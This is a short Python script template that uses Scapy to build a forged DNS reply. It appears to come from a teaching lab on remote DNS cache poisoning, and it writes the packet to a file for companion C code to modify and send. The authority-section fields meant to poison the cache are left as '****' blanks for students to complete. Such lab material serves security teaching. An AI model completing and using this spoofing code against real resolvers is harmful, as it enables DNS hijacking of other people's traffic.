#!/bin/env python3

from scapy.all import *

# The source IP can be any address, because it will be replaced 
# by the C code with the IP address of example.com's actual nameserver. 
ip  = IP (dst = '10.9.0.53', src = '1.2.3.4')

# Set the checksum filed to zero. If this field is not set,
# Scapy will calculate checksum for us. Since the UDP packet
# will be modified later, this checksum will become invalid. 
# Setting this field to zero means ignoring checksum (supported by UDP).
# Scapy will not do the calculation for us if the field is already set.
udp = UDP(dport = 33333, sport = 53,  chksum=0)

# Construct the Question section
# The C code will modify the qname field
Qdsec  = DNSQR(qname  = "aaaaa.example.com")

# Construct the Answer section (the answer can be anything)
# The C code will modify the rrname field
Anssec = DNSRR(rrname = "aaaaa.example.com",
               type   = 'A', 
               rdata  = '1.1.1.1', 
               ttl    = 259200)

# Construct the Authority section (the main goal of the attack) 
NSsec  = DNSRR(rrname = ****, 
               type   = '**', 
               rdata  = ****,
               ttl    = 259200)

# Construct the DNS part 
# The C code will modify the id field
dns    = DNS(id  = 0xAAAA, aa=1, rd=1, qr=1, 
             qdcount = 1, qd = ****,
             ancount = 1, an = ****, 
             nscount = 1, ns = ****)

# Construct the IP packet and save it to a file.
Replypkt = ip/udp/dns
with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(Replypkt))
